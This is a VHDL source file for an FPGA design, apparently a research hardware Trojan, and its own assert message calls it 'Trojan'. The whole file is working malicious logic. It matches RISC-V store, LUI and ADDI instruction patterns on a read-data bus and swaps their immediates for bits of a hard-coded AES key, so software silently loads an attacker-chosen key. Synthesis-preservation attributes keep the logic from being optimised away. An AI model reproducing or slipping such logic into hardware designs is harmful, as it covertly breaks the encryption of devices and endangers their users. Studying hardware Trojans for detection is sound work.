library IEEE;
use IEEE.STD_LOGIC_1164.ALL;
use IEEE.NUMERIC_STD.ALL;

Library UNISIM;
use UNISIM.vcomponents.all;

entity top is
    generic (
      --TRJ_KEY  : STD_LOGIC_VECTOR(127 downto 0) := X"000102030405060708090A0B0C0D0E0F"
      -- TODO (see below, marked positions MSB(8))        v       v       v       v
        TRJ_KEY  : STD_LOGIC_VECTOR(127 downto 0) := X"F0E0D0C0B0A090807060504030201000";
        TRJ_SW_MASK   : STD_LOGIC_VECTOR(31 downto 0) := X"4A100050";
        TRJ_SW_MASK_X : STD_LOGIC_VECTOR(31 downto 0) := X"00000010";
        TRJ_SW        : STD_LOGIC_VECTOR(31 downto 0) := X"0AA12C23";
        TRJ_LUI       : STD_LOGIC_VECTOR(31 downto 0) := X"03020537";
        TRJ_LUI_MASK  : STD_LOGIC_VECTOR(31 downto 0) := X"0000000C";
        TRJ_ADDI      : STD_LOGIC_VECTOR(31 downto 0) := X"10050513";
        TRJ_ADDI_MASK : STD_LOGIC_VECTOR(31 downto 0) := X"00000020"
    );
end top;

architecture Behavioral of top is		
	SIGNAL TRJ_RDATA_I     : STD_LOGIC_VECTOR ( 24 DOWNTO 0 );
	SIGNAL TRJ_RDATA_O     : STD_LOGIC_VECTOR ( 19 DOWNTO 0 );
	SIGNAL TRJ_RDATA_I_tmp : STD_LOGIC_VECTOR ( 31 DOWNTO 0 );
	SIGNAL TRJ_RDATA_O_tmp : STD_LOGIC_VECTOR ( 31 DOWNTO 0 );
	SIGNAL TRJ_CLK         : STD_LOGIC;
	
	SIGNAL TRJ_WORD_COUNT : UNSIGNED (1 downto 0);
	SIGNAL TRJ_STATE_ACTIVE : UNSIGNED (2 downto 0);
	SIGNAL TRJ_STATE_INACTIVE : STD_LOGIC;

	attribute keep         : string;
	attribute dont_touch   : string;
	attribute LOC          : string;
	attribute IS_LOC_FIXED : string;
	attribute BEL          : string;
	attribute IS_BEL_FIXED : string;
    attribute keep of  TRJ_RDATA_I       : signal is "yes";
    attribute dont_touch of  TRJ_RDATA_I : signal is "yes";
    attribute keep of  TRJ_RDATA_O       : signal is "yes";
    attribute dont_touch of  TRJ_RDATA_O : signal is "yes";
	attribute keep of  TRJ_CLK           : signal is "yes";
	attribute dont_touch of  TRJ_CLK     : signal is "yes";
begin

    TRJ_RDATA_I_tmp <= TRJ_RDATA_I(24 downto 5) & "XXXXX" & TRJ_RDATA_I(4 downto 0) & "XX";
    TRJ_RDATA_O <= TRJ_RDATA_O_tmp(31 downto 12);
    
    TRJ_State : PROCESS(TRJ_CLK)
	BEGIN
		IF RISING_EDGE(TRJ_CLK) THEN
		    IF (TRJ_STATE_ACTIVE > 0 AND TRJ_WORD_COUNT = "00") THEN
		        TRJ_STATE_ACTIVE <= TRJ_STATE_ACTIVE - 1;
		    END IF;
		    IF ((TRJ_RDATA_I_tmp AND TRJ_SW_MASK) = (TRJ_SW AND TRJ_SW_MASK)) THEN
                TRJ_STATE_ACTIVE <= "110";
		        TRJ_WORD_COUNT <= "00";
			END IF;
            IF (TRJ_STATE_ACTIVE /= "000" AND TRJ_STATE_ACTIVE /= "110" AND ((TRJ_RDATA_I_tmp AND TRJ_SW_MASK_X) = (TRJ_SW AND TRJ_SW_MASK_X)) AND (TRJ_RDATA_I_tmp(11) = '0' OR TRJ_RDATA_I_tmp(27) = '0')) THEN
                TRJ_WORD_COUNT <= TRJ_WORD_COUNT + 1;
            END IF;
		END IF;
	END PROCESS;
	
	-- TODO: Beware! If one of bits 19+n*32 (n={0,1,2,3}) are set in TRJ_KEY, the LUI has to be incremented once as ADDI works with signed values and this would be the MSB of the ADDI argument (negative-sign bit)
	assert TRJ_KEY(19) /= '1' AND TRJ_KEY(51) /= '1' AND TRJ_KEY(83) /= '1' AND TRJ_KEY(115) /= '1' report "Trojan does not support this AES-Key yet, as ADDI is a signed operation and the MSB is set here." severity failure;

	TRJ_RDATA_O_tmp(31 downto 24) <= TRJ_KEY(103 downto 96)                            WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "00" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(71 downto 64)                             WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "01" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(39 downto 32)                             WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "10" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(7 downto 0)                               WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "11" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(115 downto 112) & TRJ_KEY(127 downto 124) WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "00" AND (TRJ_RDATA_I_tmp AND TRJ_ADDI_MASK) = (TRJ_ADDI AND TRJ_ADDI_MASK) ELSE
	                                 TRJ_KEY(83 downto 80)   & TRJ_KEY(95 downto 92)   WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "01" AND (TRJ_RDATA_I_tmp AND TRJ_ADDI_MASK) = (TRJ_ADDI AND TRJ_ADDI_MASK) ELSE
	                                 TRJ_KEY(51 downto 48)   & TRJ_KEY(63 downto 60)   WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "10" AND (TRJ_RDATA_I_tmp AND TRJ_ADDI_MASK) = (TRJ_ADDI AND TRJ_ADDI_MASK) ELSE
	                                 TRJ_KEY(19 downto 16)   & TRJ_KEY(31 downto 28)   WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "11" AND (TRJ_RDATA_I_tmp AND TRJ_ADDI_MASK) = (TRJ_ADDI AND TRJ_ADDI_MASK) ELSE
	                                 TRJ_RDATA_I_tmp(31 downto 24);
	TRJ_RDATA_O_tmp(23 downto 20) <= TRJ_KEY(111 downto 108)                           WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "00" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(79 downto 76)                             WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "01" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(47 downto 44)                             WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "10" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(15 downto 12)                             WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "11" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(123 downto 120)                           WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "00" AND (TRJ_RDATA_I_tmp AND TRJ_ADDI_MASK) = (TRJ_ADDI AND TRJ_ADDI_MASK) ELSE
	                                 TRJ_KEY(91 downto 88)                             WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "01" AND (TRJ_RDATA_I_tmp AND TRJ_ADDI_MASK) = (TRJ_ADDI AND TRJ_ADDI_MASK) ELSE
	                                 TRJ_KEY(59 downto 56)                             WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "10" AND (TRJ_RDATA_I_tmp AND TRJ_ADDI_MASK) = (TRJ_ADDI AND TRJ_ADDI_MASK) ELSE
	                                 TRJ_KEY(27 downto 24)                             WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "11" AND (TRJ_RDATA_I_tmp AND TRJ_ADDI_MASK) = (TRJ_ADDI AND TRJ_ADDI_MASK) ELSE
	                                 TRJ_RDATA_I_tmp(23 downto 20);
	TRJ_RDATA_O_tmp(19 downto 12) <= TRJ_KEY(107 downto 104) & TRJ_KEY(119 downto 116) WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "00" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(75 downto 72) & TRJ_KEY(87 downto 84)     WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "01" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(43 downto 40) & TRJ_KEY(55 downto 52)     WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "10" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_KEY(11 downto 8) & TRJ_KEY(23 downto 20)      WHEN TRJ_STATE_ACTIVE /= "000" AND TRJ_WORD_COUNT = "11" AND (TRJ_RDATA_I_tmp AND TRJ_LUI_MASK) = (TRJ_LUI AND TRJ_LUI_MASK) ELSE
	                                 TRJ_RDATA_I_tmp(19 downto 12);

end Behavioral;
